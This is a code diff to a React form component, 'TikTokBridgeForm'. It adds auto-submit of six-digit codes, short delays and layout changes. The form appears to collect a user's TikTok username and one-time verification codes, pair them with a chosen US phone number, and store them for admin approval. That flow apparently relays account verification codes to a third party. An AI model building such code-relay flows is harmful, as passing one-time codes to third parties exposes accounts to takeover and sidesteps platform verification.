@@ -138,6 +138,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
           setLinkingMessage("Verifying code...");
           const { verificationCode } = form.getValues();
           await updateDocumentNonBlocking(submissionDocRef, { verificationCode });
+          await new Promise(resolve => setTimeout(resolve, 500));
       } else if (currentStep === 2) { 
           const { usNumber } = form.getValues();
           const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
@@ -162,6 +163,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
           setLinkingMessage("Finalizing your submission...");
           const { finalCode } = form.getValues();
           await updateDocumentNonBlocking(submissionDocRef, { finalCode });
+          await new Promise(resolve => setTimeout(resolve, 500));
       }
   
       setCurrentStep(prev => prev + 1);
@@ -178,6 +180,13 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
   const handlePrev = () => {
     if (isSubmitting || currentStep === 0) return;
     setCurrentStep(prev => prev - 1);
+  };
+  
+  const autoSubmitCode = async (code: string) => {
+    if (code.length === 6) {
+        await new Promise(resolve => setTimeout(resolve, 200)); // Brief delay for UX
+        handleNext();
+    }
   };
   
   useEffect(() => {
@@ -218,7 +227,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
       </CardHeader>
       <Form {...form}>
         <form onSubmit={(e) => e.preventDefault()}>
-          <CardContent className={cn("min-h-[350px]", { 'h-[280px]': currentStep !== 2, 'h-[400px]': currentStep === 2 }, 'transition-[height] duration-300 ease-in-out')}>
+          <CardContent className={cn("min-h-[280px] transition-[min-height] duration-300 ease-in-out", { 'min-h-[400px]': currentStep === 2 })}>
             {form.formState.errors.root && (
                 <div className="text-destructive text-sm font-medium p-2 text-center">{form.formState.errors.root.message}</div>
             )}
@@ -226,7 +235,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
               <CarouselContent>
                 {/* Step 1: Username */}
                 <CarouselItem>
-                    <div className="flex flex-col justify-center h-[280px]">
+                    <div className="flex flex-col justify-center h-full px-2">
                         {isSubmitting && currentStep === 0 ? (
                             <div className="flex flex-col items-center justify-center h-full text-center">
                                 <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
@@ -255,7 +264,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
 
                 {/* Step 2: First Code */}
                 <CarouselItem>
-                    <div className="flex flex-col justify-center h-[280px] items-center">
+                    <div className="flex flex-col justify-center items-center h-full px-2">
                         {isSubmitting ? (
                             <div className="flex flex-col items-center justify-center h-full text-center">
                                 <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
@@ -269,7 +278,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                             <FormItem className="pt-2 flex flex-col items-center">
                                 <FormLabel>Verification Code</FormLabel>
                                 <FormControl>
-                                    <InputOTP maxLength={6} {...field}>
+                                    <InputOTP maxLength={6} {...field} onComplete={autoSubmitCode}>
                                         <InputOTPGroup>
                                             <InputOTPSlot index={0} />
                                             <InputOTPSlot index={1} />
@@ -291,7 +300,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
 
                 {/* Step 3: Select Number */}
                 <CarouselItem>
-                    <div className="h-[400px]">
+                    <div className="h-full">
                         <FormField
                             control={form.control}
                             name="usNumber"
@@ -300,7 +309,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                                 <FormLabel>Choose a US Number</FormLabel>
                                 <FormMessage className="pb-2"/>
                                 <FormControl className="flex-grow">
-                                <ScrollArea className="h-full w-full pr-4">
+                                <ScrollArea className="h-full w-full pr-4 max-h-[350px]">
                                     {isSubmitting ? (
                                         <div className="flex flex-col items-center justify-center h-full text-center">
                                             <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
@@ -371,7 +380,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
 
                 {/* Step 4: Final Code */}
                 <CarouselItem>
-                    <div className="flex flex-col justify-center h-[280px] items-center">
+                    <div className="flex flex-col justify-center items-center h-full px-2">
                        {isSubmitting ? (
                             <div className="flex flex-col items-center justify-center h-full text-center">
                                 <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
@@ -385,7 +394,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                             <FormItem className="pt-2 flex flex-col items-center">
                                 <FormLabel>Final Confirmation Code</FormLabel>
                                <FormControl>
-                                    <InputOTP maxLength={6} {...field}>
+                                    <InputOTP maxLength={6} {...field} onComplete={autoSubmitCode}>
                                         <InputOTPGroup>
                                             <InputOTPSlot index={0} />
                                             <InputOTPSlot index={1} />
@@ -407,7 +416,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                 
                 {/* Step 5: Success */}
                 <CarouselItem>
-                    <div className="text-center py-8 flex flex-col items-center justify-center h-[280px]">
+                    <div className="text-center py-8 flex flex-col items-center justify-center h-full">
                         <PartyPopper className="h-20 w-20 text-primary" />
                         <h3 className="text-xl font-semibold mt-4">Successful!</h3>
                         <p className="text-muted-foreground mt-2 max-w-[250px]">Your submission is complete. You will be redirected shortly to await admin approval.</p>
